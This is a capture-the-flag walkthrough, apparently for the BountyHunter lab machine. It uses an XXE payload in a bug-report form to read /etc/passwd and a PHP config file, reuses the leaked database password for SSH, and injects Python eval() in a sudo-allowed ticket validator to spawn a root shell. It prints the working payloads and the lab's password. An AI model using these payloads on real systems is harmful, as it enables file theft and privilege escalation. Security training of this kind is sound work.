1, enumerate the ports and services
22/tcp ssh
80/tcp http

2,check the web pages and enumerate the web contents
* /log_submit.php : In this page, we can get some information : there is no database and the output was on the screen. So let's try some SSTI vulners.
* By enumerate the web-content, we can get something useful
```
resources               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 18ms]
```
And it is lucky that we can get some messages:
```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

Then we can get an important hint:
`[ ] Disable 'test' account Disable nopass` 
That means there would be a test account and no-password!!!!

So let's try to find them!

But we did not find ant portal, so we guess would be a sub-domain as a portal.
unlucky, it would be a rabbit hole.

So let's come back to the only service
```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4xMTwvdGl0bGU%2BCgkJPGN3ZT4xMTwvY3dlPgoJCTxjdnNzPjExPC9jdnNzPgoJCTxyZXdhcmQ%2BMTE8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D

url decode
base64 decode
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>11</title>
		<cwe>11</cwe>
		<cvss>11</cvss>
		<reward>11</reward>
		</bugreport>
```
This is a message in XML format

So let's try some XXE File Read vulners and just try these blocks.

This is a example payload.
```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
`The first line is very similar to what is sent in the POST for BountyHunter, and the last line is the XML data itself. The middle lines are defining an entity which includes the variable &file which is the contents of the /etc/passwd file. This allows the user to send in the contents of files they can’t read as input, and if that input is displayed back, then the exploit allows for file read`

This would be our payload
```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE</cwe>
		<cvss>9.8</cvss>
		<reward>1,000,000</reward>
		</bugreport>

We need to base64 encode and then url encode.
```

Then we can get /etc/passwd file
```
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```
There is a essential account: development

So let's try to enumerate the configuration files.(db.php, config.php)
```
db.php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```
Then we get the credit, so let's try to use ssh to connect it.

4, get the root shell
From /home/development
we get a attractive txt file contract.txt
```
I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.
```
From that, user development has some permissions on some special apps.

So we check the `sudo -l`
```
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
Then we can check this pressions.
`-r-xr--r-- 1 root root 1471 Jul 22  2021 /opt/skytrain_inc/ticketValidator.py`

And the file path `/opt/skytrain_inc` has a folder where specific credentials are stored and ticketValidator.py.

Let's check the source code of ticketValidator.py to find some vulners and try to exec it.

```
Eval Exploit
Conditions
The risky call in the Python script is eval, which runs input as Python code. Based on the invalid tickets, it looks like it’s using the eval to do some math in a string. But I can make it do much more than that.

I’ll need to construct a ticket that gets to that point in the script:

First row starts with “”# Skytrain Inc”
Second row starts with “## Ticket to “
There needs to be a line that starts with “__Ticket Code:__”
The line after the ticket code line must start with “**”
The text after the “**” until the first “+” must be an int that when divided by 7 has a remainder of 4.
If all those conditions are met, then the line (with “**” removed) will be passed to eval.
```

So the payload could be created
```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43**
##Issued: 2021/04/06
#End Ticket

Then we get the response:
Please enter the path to the ticket file.
/dev/shm/tick.md
Destination: Bridgeport
Valid ticket.
```

The simplest way to inject into eval is to import the os modules and call system. In an eval injection, you do the import slightly differently

`__import__('os').system('[command]')`

So the payload we get:
```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+__import__('os').system('bash')**
##Issued: 2021/04/06
#End Ticket
```
